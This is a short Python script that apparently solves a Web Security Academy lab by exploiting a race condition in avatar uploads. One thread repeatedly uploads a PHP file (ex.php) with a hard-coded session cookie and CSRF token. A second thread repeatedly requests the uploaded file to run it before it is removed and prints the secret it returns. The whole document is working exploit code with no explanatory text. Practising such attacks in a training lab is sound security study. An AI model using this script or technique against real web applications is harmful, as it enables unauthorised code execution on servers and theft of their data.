import requests
import threading


URL = "https://acc41fd91ed61a11c04d9ae3005c0065.web-security-academy.net/"
# HEADERS = {"Content-Type":"image/jpeg"}

COOKIES = {"session":"E5Wt5EO530kGJzxk5sMpLPR3Hfng5USg"}
CSRF = {"user":"wiener", "csrf":"bWDG9VTzVBHpEcmaEG3XsSJGHrLQQ2bP"}
FILES = {"avatar":open('ex.php', 'rb')}

def upload():
    while True:
        req = requests.post(url=URL+"my-account/avatar", cookies=COOKIES, files=FILES, data=CSRF).text
        print("[+] UPLOADED")
        # break
       
def getSecret():
    while True:
        req = requests.get(url=URL+"files/avatars/ex.php", cookies=COOKIES, data=CSRF)
        if req.status_code == 404:
            print("[-] FILE NOT FOUND")
        else:
            print("[+] FOUND SECRET")
            print(req.text)

def main():
    t1 = threading.Thread(target=getSecret)
    t2 = threading.Thread(target=upload)
    
    t1.start()
    t2.start()
if __name__ == '__main__':
    main()


